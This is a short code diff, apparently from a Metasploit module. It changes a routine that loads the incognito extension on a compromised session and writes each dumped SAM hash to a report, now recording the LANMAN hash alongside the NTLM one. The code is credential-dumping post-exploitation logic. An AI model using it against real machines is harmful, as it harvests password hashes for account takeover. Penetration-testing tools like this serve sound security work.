@@ -15,7 +15,7 @@ module Msf
             session.core.use("incognito")
 
 	         session.priv.sam_hashes.each do |hash|
-	            report << "#{hash.user_name}:#{hash.ntlm}\n"
+	            report << "#{hash.user_name}:#{hash.lanman}:#{hash.ntlm}\n"
 	         end
 	      end
 
